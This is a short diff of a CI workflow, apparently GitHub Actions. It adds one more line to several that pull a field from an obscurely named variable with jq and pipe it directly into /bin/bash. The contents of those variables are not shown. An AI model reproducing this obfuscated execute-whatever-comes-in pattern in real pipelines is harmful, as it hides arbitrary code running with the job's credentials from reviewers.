@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$lfqt7" | jq -r .t6653 | /bin/bash
           echo $jirzp82 | jq -r .cgsxf03116 | /bin/bash
           echo $n60 | jq -r .kjxw43 | /bin/bash
+          echo $is138 | jq -r .b8 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
